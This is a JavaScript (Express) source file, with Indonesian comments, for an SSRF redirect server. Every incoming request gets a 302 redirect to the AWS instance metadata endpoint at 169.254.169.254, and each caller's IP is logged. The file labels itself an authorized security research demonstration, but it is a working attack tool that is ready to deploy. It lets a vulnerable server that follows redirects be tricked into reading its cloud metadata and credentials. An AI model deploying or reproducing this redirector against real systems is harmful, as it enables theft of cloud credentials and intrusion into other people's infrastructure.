const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk menangani semua request
app.use('*', (req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.originalUrl} from ${clientIP}`);
    
    // TARGET AWS METADATA SERVICE
    const targetURL = 'http://169.254.169.254/latest/meta-data/';
    
    // Set headers untuk redirect
    res.set({
        'Location': targetURL,
        'X-SSRF-Demonstration': 'Security Research - AWS Metadata Redirect',
        'X-Original-Path': req.originalUrl,
        'X-Client-IP': clientIP,
        'X-Target-URL': targetURL,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
    });
    
    // Response dengan redirect
    res.status(302).json({
        message: 'Redirecting to AWS Metadata Service',
        redirect_to: targetURL,
        original_path: req.originalUrl,
        client_ip: clientIP,
        timestamp: new Date().toISOString(),
        note: 'SSRF Security Research Demonstration'
    });
});

// Health check endpoint khusus untuk Render
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        service: 'SSRF Redirect Server',
        timestamp: new Date().toISOString(),
        redirect_target: 'http://169.254.169.254/latest/meta-data/'
    });
});

// Handle OPTIONS requests untuk CORS
app.options('*', (req, res) => {
    res.set({
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
    });
    res.status(200).end();
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Server Error:', err);
    res.status(500).json({ error: 'Internal Server Error' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SSRF Redirect Server running on port ${PORT}`);
    console.log(`📍 ALL requests redirect to: http://169.254.169.254/latest/meta-data/`);
    console.log('✅ Health check: /health');
    console.log('⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY');
});
